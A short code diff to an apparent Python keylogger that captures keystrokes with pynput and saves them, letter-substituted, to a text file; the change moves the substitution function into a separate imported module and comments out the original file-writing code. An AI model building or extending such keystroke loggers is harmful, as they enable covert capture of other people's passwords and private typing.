@@ -4,12 +4,13 @@
 
 from pynput import keyboard
 from pynput.keyboard import Listener
+from Encription_File import *
 
 Stroke = None
 
-storage = open('KeyBoard_Save.txt', 'a')
+#storage = open('KeyBoard_Save.txt', 'a')
 
-def encription(x):
+'''def encription(x):
     global Stroke
     if x == 'A':
         storage.write('e')
@@ -137,7 +138,7 @@ def encription(x):
         storage.write('z')
     else:
         pass
-
+'''
 
 def record_click(key):
     global Stroke  # Declare that we are using the global variable
